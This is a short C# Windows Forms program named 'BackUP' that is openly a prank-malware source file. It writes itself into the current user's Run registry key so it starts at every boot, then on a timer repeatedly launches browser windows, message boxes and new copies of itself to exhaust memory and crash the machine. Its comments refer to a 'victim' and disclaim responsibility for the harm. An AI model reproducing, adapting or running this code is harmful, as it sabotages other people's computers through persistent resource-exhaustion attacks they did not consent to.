using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BackUP
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("BackUP.exe", Application.ExecutablePath); // This make the file a startup item, so the pc will crash everytime it's being booted.
                                                                    // You can change this if you don't want to harm the victim that much.
            MessageBox.Show("Hello!"); // Your message before the crash.
                                      // Note: Even if the victim closes the message box the program will still start.
            timer1.Start(); // Starts the actual program.
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://" + Environment.UserName);
            MessageBox.Show(Environment.UserName);                               // This will basicly crash the whole pc or atleast kill your ram.
            System.Diagnostics.Process.Start("BackUP.exe");

            // Note: i'm not responsible about the harm you make!
        }
    }
}
